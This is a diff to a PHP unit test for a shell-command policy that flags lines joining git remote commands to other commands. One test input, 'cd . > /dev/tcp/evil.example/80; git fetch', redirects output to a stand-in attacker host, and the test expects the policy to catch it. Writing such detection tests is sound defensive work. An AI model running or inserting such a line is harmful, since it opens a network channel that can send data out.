@@ -176,6 +176,26 @@ final class CommandPolicyTest extends TestCase
         self::assertSame(Verdict::AskEveryTime, $this->assess('git push origin main', [$this->refusal('git', 'push', '--force')])->verdict);
     }
 
+    /**
+     * @return iterable<string, array{string, bool}>
+     */
+    public static function linesMixingARemote(): iterable
+    {
+        yield 'a remote alone' => ['git pull', false];
+        yield 'two remotes' => ['git fetch && git pull', false];
+        yield 'a remote after a cd' => ['cd app && git pull', false];
+        yield 'no remote' => ['make test && php -r 1', false];
+        yield 'a remote and a script' => ["git remote -v; php -r 'require \"job.php\";'", true];
+        yield 'a remote piped into another command' => ['git ls-remote origin | grep main', true];
+        yield 'a remote after a cd with a redirection' => ['cd . > /dev/tcp/evil.example/80; git fetch', true];
+    }
+
+    #[DataProvider('linesMixingARemote')]
+    public function testALineJoiningARemoteToOtherPartsIsMarked(string $line, bool $expected): void
+    {
+        self::assertSame($expected, $this->assess($line)->mixesARemoteWithOtherParts);
+    }
+
     #[DataProvider('remoteCommands')]
     public function testACommandThatTalksToAnotherMachineNeedsTheSshAgent(string $line, bool $expected): void
     {
